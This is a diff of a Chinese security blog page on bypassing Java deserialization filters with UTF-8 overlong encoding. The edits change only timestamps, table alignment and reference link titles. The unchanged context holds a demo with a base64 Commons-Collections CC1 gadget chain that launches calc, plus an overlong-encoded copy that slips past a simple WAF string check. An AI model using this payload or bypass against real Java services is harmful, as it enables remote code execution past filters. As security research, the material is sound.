@@ -140,7 +140,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/redefine-og.webp">
 <meta property="article:published_time" content="2025-09-21T12:24:10.010Z">
-<meta property="article:modified_time" content="2025-09-21T12:25:05.274Z">
+<meta property="article:modified_time" content="2025-09-21T12:29:22.056Z">
 <meta property="article:author" content="exp3n5ive">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
@@ -409,8 +409,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-09-21 20:25:05</span>
-            <span class="mobile">2025-09-21 20:25:05</span>
+            <span class="desktop">2025-09-21 20:29:22</span>
+            <span class="mobile">2025-09-21 20:29:22</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -489,45 +489,45 @@
 <table>
 <thead>
 <tr>
-<th>First code point</th>
-<th>Last code point</th>
-<th>Byte 1</th>
-<th>Byte 2</th>
-<th>Byte 3</th>
-<th>Byte 4</th>
+<th align="center">First code point</th>
+<th align="center">Last code point</th>
+<th align="center">Byte 1</th>
+<th align="center">Byte 2</th>
+<th align="center">Byte 3</th>
+<th align="center">Byte 4</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>U+0000</td>
-<td>U+007F</td>
-<td>0xxxxxxx</td>
-<td></td>
-<td></td>
-<td></td>
+<td align="center">U+0000</td>
+<td align="center">U+007F</td>
+<td align="center">0xxxxxxx</td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center"></td>
 </tr>
 <tr>
-<td>U+0080</td>
-<td>U+07FF</td>
-<td>110xxxxx</td>
-<td>10xxxxxx</td>
-<td></td>
-<td></td>
+<td align="center">U+0080</td>
+<td align="center">U+07FF</td>
+<td align="center">110xxxxx</td>
+<td align="center">10xxxxxx</td>
+<td align="center"></td>
+<td align="center"></td>
 </tr>
 <tr>
-<td>U+0800</td>
-<td>U+FFFF</td>
-<td>1110xxxx</td>
-<td>10xxxxxx</td>
-<td>10xxxxxx</td>
-<td></td>
+<td align="center">U+0800</td>
+<td align="center">U+FFFF</td>
+<td align="center">1110xxxx</td>
+<td align="center">10xxxxxx</td>
+<td align="center">10xxxxxx</td>
+<td align="center"></td>
 </tr>
 <tr>
-<td>U+10000</td>
-<td>U+10FFFF</td>
-<td>11110xxx</td>
-<td>10xxxxxx</td>
-<td>10xxxxxx</td>
-<td>10xxxxxx</td>
+<td align="center">U+10000</td>
+<td align="center">U+10FFFF</td>
+<td align="center">11110xxx</td>
+<td align="center">10xxxxxx</td>
+<td align="center">10xxxxxx</td>
+<td align="center">10xxxxxx</td>
 </tr>
 </tbody></table>
 <p>举个例子 , 欧元符号 <code>€</code> 的 unicode 编码是 U+20AC , 按照如下方法将其转换成 UTF-8 编码 : </p>
@@ -563,10 +563,10 @@
 
 <div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.utils.SerializeUtil;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OverlongEncoding_CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">before</span> <span class="operator">=</span> <span class="string">&quot;rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAARzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXB0AAlnZXRNZXRob2R1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+AB9zcQB+ABZ1cQB+ABsAAAACcHB0AAZpbnZva2V1cQB+AB8AAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAbc3EAfgAWdXEAfgAbAAAAAXQABGNhbGN0AARleGVjdXEAfgAfAAAAAXEAfgAic3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAADHcIAAAAEAAAAAF0AAV2YWx1ZXQAB3VzZWxlc3N4eHZyABtqYXZhLmxhbmcuYW5ub3RhdGlvbi5UYXJnZXQAAAAAAAAAAAAAAHhwcQB+ADU=&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">after</span> <span class="operator">=</span> <span class="string">&quot;rO0ABXNyAJbggbPggbXgga7ggK7ggbLggaXggabggazggaXggaPggbTggK7ggaHgga7gga7gga/ggbTggaHggbTggangga/gga7ggK7ggYHgga7gga7gga/ggbTggaHggbTggangga/gga7ggYngga7ggbbgga/ggaPggaHggbTggangga/gga7ggYjggaHgga7ggaTggazggaXggbJVyvUPFct+pQIAAkwADG1lbWJlclZhbHVlc3QAD0xqYXZhL3V0aWwvTWFwO0wABHR5cGV0ABFMamF2YS9sYW5nL0NsYXNzO3hwc30AAAABAA1qYXZhLnV0aWwuTWFweHIAReCBquCBoeCBtuCBoeCAruCBrOCBoeCBruCBp+CAruCBsuCBpeCBpuCBrOCBpeCBo+CBtOCAruCBkOCBsuCBr+CBuOCBueEn2iDMEEPLAgABTAABaHQAJUxqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uSGFuZGxlcjt4cHNxAH4AAHNyAH7gga/ggbLggafggK7ggaHggbDggaHggaPggajggaXggK7ggaPgga/gga3gga3gga/gga7ggbPggK7ggaPgga/ggazggazggaXggaPggbTggangga/gga7ggbPggK7gga3ggaHggbDggK7ggYzggaHggbrggbnggY3ggaHggbBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAruCBr+CBsuCBp+CAruCBoeCBsOCBoeCBo+CBqOCBpeCAruCBo+CBr+CBreCBreCBr+CBruCBs+CAruCBo+CBr+CBrOCBrOCBpeCBo+CBtOCBqeCBr+CBruCBs+CAruCBpuCBteCBruCBo+CBtOCBr+CBsuCBs+CAruCBg+CBqOCBoeCBqeCBruCBpeCBpOCBlOCBsuCBoeCBruCBs+CBpuCBr+CBsuCBreCBpeCBsjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIAh+CBm+CBjOCBr+CBsuCBp+CAruCBoeCBsOCBoeCBo+CBqOCBpeCAruCBo+CBr+CBreCBreCBr+CBruCBs+CAruCBo+CBr+CBrOCBrOCBpeCBo+CBtOCBqeCBr+CBruCBs+CAruCBlOCBsuCBoeCBruCBs+CBpuCBr+CBsuCBreCBpeCBsuCAu71WKvHYNBiZAgAAeHAAAAAEc3IAseCBr+CBsuCBp+CAruCBoeCBsOCBoeCBo+CBqOCBpeCAruCBo+CBr+CBreCBreCBr+CBruCBs+CAruCBo+CBr+CBrOCBrOCBpeCBo+CBtOCBqeCBr+CBruCBs+CAruCBpuCBteCBruCBo+CBtOCBr+CBsuCBs+CAruCBg+CBr+CBruCBs+CBtOCBoeCBruCBtOCBlOCBsuCBoeCBruCBs+CBpuCBr+CBsuCBreCBpeCBslh2kBFBArGUAgABTAAJaUNvbnN0YW50dAASTGphdmEvbGFuZy9PYmplY3Q7eHB2cgAz4IGq4IGh4IG24IGh4ICu4IGs4IGh4IGu4IGn4ICu4IGS4IG14IGu4IG04IGp4IGt4IGlAAAAAAAAAAAAAAB4cHNyAK7gga/ggbLggafggK7ggaHggbDggaHggaPggajggaXggK7ggaPgga/gga3gga3gga/gga7ggbPggK7ggaPgga/ggazggazggaXggaPggbTggangga/gga7ggbPggK7ggabggbXgga7ggaPggbTgga/ggbLggbPggK7ggYngga7ggbbgga/ggavggaXggbLggZTggbLggaHgga7ggbPggabgga/ggbLgga3ggaXggbKH6P9re3zOOAIAA1sABWlBcmdzdAATW0xqYXZhL2xhbmcvT2JqZWN0O0wAC2lNZXRob2ROYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyADnggZvggYzggarggaHggbbggaHggK7ggazggaHgga7ggafggK7ggY/ggaLggarggaXggaPggbTggLuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWVwdAAJZ2V0TWV0aG9kdXIANuCBm+CBjOCBquCBoeCBtuCBoeCAruCBrOCBoeCBruCBp+CAruCBg+CBrOCBoeCBs+CBs+CAu6sW167LzVqZAgAAeHAAAAACdnIAMOCBquCBoeCBtuCBoeCAruCBrOCBoeCBruCBp+CAruCBk+CBtOCBsuCBqeCBruCBp6DwpDh6O7NCAgAAeHB2cQB+AB9zcQB+ABZ1cQB+ABsAAAACcHB0AAZpbnZva2V1cQB+AB8AAAACdnIAMOCBquCBoeCBtuCBoeCAruCBrOCBoeCBruCBp+CAruCBj+CBouCBquCBpeCBo+CBtAAAAAAAAAAAAAAAeHB2cQB+ABtzcQB+ABZ1cQB+ABsAAAABdAAEY2FsY3QABGV4ZWN1cQB+AB8AAAABcQB+ACJzcgAz4IGq4IGh4IG24IGh4ICu4IG14IG04IGp4IGs4ICu4IGI4IGh4IGz4IGo4IGN4IGh4IGwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAADHcIAAAAEAAAAAF0AAV2YWx1ZXQAB3VzZWxlc3N4eHZyAFHggarggaHggbbggaHggK7ggazggaHgga7ggafggK7ggaHgga7gga7gga/ggbTggaHggbTggangga/gga7ggK7ggZTggaHggbLggafggaXggbQAAAAAAAAAAAAAAHhwcQB+ADU=&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] decodedData = Base64.getDecoder().decode(after);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">new</span> <span class="title class_">String</span>(decodedData).contains(<span class="string">&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;waf!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            SerializeUtil.deserialize(decodedData);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 
-<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/fcuKNfLXiFxWrIYQPq7OCg" >https://mp.weixin.qq.com/s/fcuKNfLXiFxWrIYQPq7OCg<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/13372" >https://xz.aliyun.com/news/13372<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://vidar-team.feishu.cn/docx/LJN4dzu1QoEHt4x3SQncYagpnGd" >https://vidar-team.feishu.cn/docx/LJN4dzu1QoEHt4x3SQncYagpnGd<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://clowsman.github.io/2024/10/20/UTF-8-Overlong-Encoding%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/index.html" >https://clowsman.github.io/2024/10/20/UTF-8-Overlong-Encoding%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/index.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/fcuKNfLXiFxWrIYQPq7OCg" >UTF-8 Overlong Encoding导致的安全问题<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/13372" >java原生反序列化OverlongEncoding分析及实战-先知社区<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://vidar-team.feishu.cn/docx/LJN4dzu1QoEHt4x3SQncYagpnGd" >﻿‌⁡⁤⁣⁣‍﻿‬﻿⁣⁢‍‌‍⁢⁢⁤⁡‌⁢⁤﻿⁣﻿﻿⁢‌⁡﻿‬⁡⁡‍⁤﻿⁢⁢⁢⁤‌探索Java反序列化绕WAF新姿势 - 飞书云文档<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://clowsman.github.io/2024/10/20/UTF-8-Overlong-Encoding%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/index.html" >UTF-8 Overlong Encoding绕过学习 | clown<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
 
 		</div>
 
@@ -581,7 +581,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-09-21 20:25:05
+                    :</strong> 2025-09-21 20:29:22
             </li>
         
         <li>
